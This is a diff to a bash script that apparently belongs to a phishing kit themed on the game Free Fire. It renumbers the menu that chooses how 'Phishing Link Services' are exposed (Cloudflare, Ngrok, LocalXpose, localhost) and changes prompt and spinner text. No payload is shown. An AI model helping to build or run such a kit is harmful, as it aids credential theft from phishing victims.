@@ -37,31 +37,31 @@ logo3
 echo -e "\e[1;96m  \e[m "
 printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
 echo " "
-printf "\e[1;31m[\e[0m\e[1;92mA\e[0m\e[1;31m] \e[0m\e[1;37;44m Cloudflare \e[0m   \e[0;91m[\e[0;96mAuto Detects\e[0;91m] "
+printf "\e[1;31m[\e[0m\e[1;92m1\e[0m\e[1;31m] \e[0m\e[1;37;44m Cloudflare \e[0m   \e[0;91m[\e[0;96mAuto Detects\e[0;91m] "
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
 echo
-printf "\e[1;31m[\e[0m\e[1;92mB\e[0m\e[1;31m] \e[0m\e[1;37;41m Ngrok \e[0m        \e[0;91m[\e[0;96mAccount Token Needed\e[0;91m]   "
+printf "\e[1;31m[\e[0m\e[1;92m2\e[0m\e[1;31m] \e[0m\e[1;37;41m Ngrok \e[0m        \e[0;91m[\e[0;96mAccount Token Needed\e[0;91m]   "
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92mC\e[0m\e[1;31m] \e[0m\e[1;91;107m LocalXpose \e[0m   \e[0;91m[\e[0;95mNEW! \e[96mMax 15Min\e[0;91m]  "
+printf "\e[1;31m[\e[0m\e[1;92m3\e[0m\e[1;31m] \e[0m\e[1;91;107m LocalXpose \e[0m   \e[0;91m[\e[0;95mNEW! \e[96mMax 15Min\e[0;91m]  "
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92mD\e[0m\e[1;31m] \e[0m\e[1;48;5;21m Apache2 \e[0m      \e[0;91m[\e[0;96mComing soon\e[0;91m] "
+printf "\e[1;31m[\e[0m\e[1;92m4\e[0m\e[1;31m] \e[0m\e[1;48;5;21m Apache2 \e[0m      \e[0;91m[\e[0;96mComing soon\e[0;91m] "
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
 echo
-printf "\e[1;31m[\e[0m\e[1;92mE\e[0m\e[1;31m] \e[0m\e[1;48;5;200m LocalHost\e[0m     \e[0;91m[\e[0;96mOnly This Devices!\e[0;91m]  "
+printf "\e[1;31m[\e[0m\e[1;92m5\e[0m\e[1;31m] \e[0m\e[1;48;5;200m LocalHost\e[0m     \e[0;91m[\e[0;96mOnly This Devices!\e[0;91m]  "
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
 echo " "
 
-read -p $'\e[1;32m\e[93m Please enter your Option (\e[95mA/B/C\e[93m) : \e[97m ' portfrd
-if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "cloudflare" ]]; then
+read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[93m You Want to Choose Phishing Link Services Option : \e[97m ' portfrd
+if [[ $portfrd == "1" || $portfrd == "a" || $portfrd == "cloudflare" ]]; then
 echo ""
 hotspot
 start_cloudflared
@@ -87,7 +87,7 @@ links_c
 			   
 
 fi
-if [[ $portfrd == "B" || $portfrd == "b" || $portfrd == "ngrok" ]]; then
+if [[ $portfrd == "2" || $portfrd == "b" || $portfrd == "ngrok" ]]; then
 echo ""
 hotspot
 clear
@@ -114,7 +114,7 @@ l_logo
 links_n
 
 fi
-if [[ $portfrd == "C" || $portfrd == "c" || $portfrd == "localxpose" ]]; then
+if [[ $portfrd == "3" || $portfrd == "c" || $portfrd == "localxpose" ]]; then
 echo ""
 hotspot
 start_loclx
@@ -141,14 +141,16 @@ links_l
 
 
 fi
-if [[ $portfrd == "D" || $portfrd == "d" || $portfrd == "apache2" ]]; then
+if [[ $portfrd == "4" || $portfrd == "d" || $portfrd == "apache2" ]]; then
 
+echo -e "\e[96m Coming soon..." 
+sleep 3
 clear
 select_url
 
 fi
 
-if [[ $portfrd == "E" || $portfrd == "e" || $portfrd == "localhost" ]]; then
+if [[ $portfrd == "5" || $portfrd == "e" || $portfrd == "localhost" ]]; then
 echo ""
 clear
 l_logo
@@ -782,7 +784,7 @@ local spinstr='|/-\'
 while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 local temp=${spinstr#?}
 tput civis
-printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
+printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Online Hacking FreeFire Server Connecting... ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
 local spinstr=$temp${spinstr%"$temp"}
 sleep $delay
 printf "\b\b\b\b\b\b"
@@ -801,7 +803,7 @@ local spinstr='|/-\'
 while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 local temp=${spinstr#?}
 tput civis
-printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Server Status Chacking [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
+printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Server Status Chacking ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
 local spinstr=$temp${spinstr%"$temp"}
 sleep $delay
 printf "\b\b\b\b\b\b"
@@ -823,7 +825,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 for i in "${spinner[@]}"
 do
 	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m PHP Server Now Startng ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
+	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;96m PHP Server Now Startng ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
 done
@@ -845,7 +847,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 for i in "${spinner[@]}"
 do
 	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Start LocalHost... :  \e[0m http://127.0.0.1:4444 \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
+	echo -ne "\033[1;91m\r[\e[1;92m-\e[1;91m]\e[1;95m Start LocalHost...   \e[97m http://127.0.0.1:4444 \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
 done
@@ -867,7 +869,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 for i in "${spinner[@]}"
 do
 	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m  Launching Link Service... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
+	echo -ne "\033[1;91m\r[\e[1;95m-\e[1;91m]\e[1;92m  Launching Link Service ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
 done
